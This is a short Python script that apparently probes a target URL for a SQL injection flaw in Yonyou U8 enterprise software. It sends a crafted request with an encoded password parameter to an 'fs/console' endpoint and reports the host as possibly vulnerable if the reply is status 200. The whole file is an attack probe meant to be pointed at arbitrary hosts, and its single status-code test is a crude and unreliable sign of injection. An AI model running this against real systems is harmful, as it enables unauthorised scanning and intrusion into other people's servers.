import time
import requests
import re
import sys
from urllib.parse import quote

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    url = target_url + 'fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Upgrade-Insecure-Requests": "1",
    }
    success_msg = now_time() + '[SUCCESS]该系统可能存在SQL注入漏洞'
    shell_msg = now_time() + '具体URL为: {}'.format(url)
    warning_msg = now_time() + '[WARNING]该系统的用友U8不存在SQL注入'
    error_msg = now_time() + '[用友U8的QL注入][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg

